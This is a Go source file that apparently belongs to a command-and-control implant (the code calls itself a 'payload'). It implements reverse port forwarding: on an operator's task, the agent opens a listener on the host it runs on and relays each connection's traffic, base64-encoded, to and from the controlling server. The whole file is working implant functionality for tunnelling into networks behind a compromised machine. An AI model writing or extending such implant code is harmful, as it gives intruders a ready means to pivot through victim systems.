package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"sync"
)

type rpfwdListener struct {
	port     int
	listener net.Listener
}

type rpfwdConnection struct {
	serverID int
	port     int
	conn     net.Conn
}

type rpfwdRegistry struct {
	owner     *AgentController
	mu        sync.RWMutex
	listeners map[int]*rpfwdListener
	conns     map[string]*rpfwdConnection
}

func newRpfwdRegistry(owner *AgentController) *rpfwdRegistry {
	return &rpfwdRegistry{
		owner:     owner,
		listeners: make(map[int]*rpfwdListener),
		conns:     make(map[string]*rpfwdConnection),
	}
}

func (r *rpfwdRegistry) Start(port int) error {
	if !runtimeConfig.RpfwdEnabled {
		return fmt.Errorf("payload 未启用 rpfwd 能力")
	}
	r.mu.Lock()
	if _, exists := r.listeners[port]; exists {
		r.mu.Unlock()
		return fmt.Errorf("rpfwd 端口 %d 已经在监听", port)
	}
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		r.mu.Unlock()
		return err
	}
	entry := &rpfwdListener{port: port, listener: listener}
	r.listeners[port] = entry
	r.mu.Unlock()
	go r.acceptLoop(entry)
	return nil
}

func (r *rpfwdRegistry) Stop(port int) {
	r.mu.Lock()
	listener, ok := r.listeners[port]
	if ok {
		delete(r.listeners, port)
	}
	connections := r.connectionsForPortLocked(port)
	for key := range r.conns {
		if r.conns[key].port == port {
			delete(r.conns, key)
		}
	}
	r.mu.Unlock()
	if ok {
		_ = listener.listener.Close()
	}
	for _, connection := range connections {
		r.owner.enqueueRpfwdOutput(connection.serverID, connection.port, nil, true)
		_ = connection.conn.Close()
	}
}

func (r *rpfwdRegistry) StopAll() {
	r.mu.Lock()
	ports := make([]int, 0, len(r.listeners))
	for port := range r.listeners {
		ports = append(ports, port)
	}
	r.mu.Unlock()
	for _, port := range ports {
		r.Stop(port)
	}
}

func (r *rpfwdRegistry) Handle(message RpfwdMessage) error {
	if !runtimeConfig.RpfwdEnabled {
		return fmt.Errorf("payload 未启用 rpfwd 能力")
	}
	key := r.rpfwdKey(message.ServerID, message.Port)
	r.mu.RLock()
	connection, ok := r.conns[key]
	r.mu.RUnlock()
	if !ok {
		return fmt.Errorf("未找到 rpfwd 连接: server_id=%d port=%d", message.ServerID, message.Port)
	}
	data, err := base64.StdEncoding.DecodeString(message.Data)
	if err != nil && message.Data != "" {
		return fmt.Errorf("解析 rpfwd 数据失败: %w", err)
	}
	if len(data) > 0 {
		if _, err := connection.conn.Write(data); err != nil {
			r.removeConnection(message.ServerID, message.Port)
			_ = connection.conn.Close()
			r.owner.enqueueRpfwdOutput(message.ServerID, message.Port, nil, true)
			return fmt.Errorf("写入 rpfwd 连接失败: %w", err)
		}
	}
	if message.Exit {
		r.removeConnection(message.ServerID, message.Port)
		_ = connection.conn.Close()
		r.owner.enqueueRpfwdOutput(message.ServerID, message.Port, nil, true)
	}
	return nil
}

func (r *rpfwdRegistry) acceptLoop(listener *rpfwdListener) {
	for {
		conn, err := listener.listener.Accept()
		if err != nil {
			return
		}
		serverID := randomUint32()
		entry := &rpfwdConnection{serverID: serverID, port: listener.port, conn: conn}
		r.mu.Lock()
		r.conns[r.rpfwdKey(serverID, listener.port)] = entry
		r.mu.Unlock()
		go r.readLoop(entry)
	}
}

func (r *rpfwdRegistry) readLoop(connection *rpfwdConnection) {
	buffer := make([]byte, 4096)
	for {
		n, err := connection.conn.Read(buffer)
		if n > 0 {
			chunk := append([]byte(nil), buffer[:n]...)
			r.owner.enqueueRpfwdOutput(connection.serverID, connection.port, chunk, false)
		}
		if err != nil {
			r.removeConnection(connection.serverID, connection.port)
			_ = connection.conn.Close()
			r.owner.enqueueRpfwdOutput(connection.serverID, connection.port, nil, true)
			return
		}
	}
}

func (r *rpfwdRegistry) HasActiveSessions() bool {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return len(r.listeners) > 0 || len(r.conns) > 0
}

func (r *rpfwdRegistry) removeConnection(serverID int, port int) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.conns, r.rpfwdKey(serverID, port))
}

func (r *rpfwdRegistry) rpfwdKey(serverID int, port int) string {
	return fmt.Sprintf("%d:%d", port, serverID)
}

func (r *rpfwdRegistry) connectionsForPortLocked(port int) []*rpfwdConnection {
	connections := make([]*rpfwdConnection, 0)
	for _, connection := range r.conns {
		if connection.port == port {
			connections = append(connections, connection)
		}
	}
	return connections
}

func randomUint32() int {
	var buf [4]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return 1
	}
	return int(binary.BigEndian.Uint32(buf[:]))
}

func (c *AgentController) executeRpfwdStart(task Task) TaskResponse {
	var params struct {
		LocalPort int `json:"local_port"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	if params.LocalPort < 1 {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: local_port 必须大于 0", Completed: true, Status: "error: invalid local_port"}
	}
	if err := c.rpfwd.Start(params.LocalPort); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 启动 rpfwd 失败: " + err.Error(), Completed: true, Status: "error: rpfwd start failed"}
	}
	return TaskResponse{TaskID: task.ID, UserOutput: fmt.Sprintf("RPFWD 已启动，本地监听端口 %d", params.LocalPort), Completed: true, Status: "success"}
}

func (c *AgentController) executeRpfwdStop(task Task) TaskResponse {
	var params struct {
		LocalPort int `json:"local_port"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	if params.LocalPort < 1 {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: local_port 必须大于 0", Completed: true, Status: "error: invalid local_port"}
	}
	c.rpfwd.Stop(params.LocalPort)
	return TaskResponse{TaskID: task.ID, UserOutput: fmt.Sprintf("RPFWD 已停止，本地端口 %d", params.LocalPort), Completed: true, Status: "success"}
}
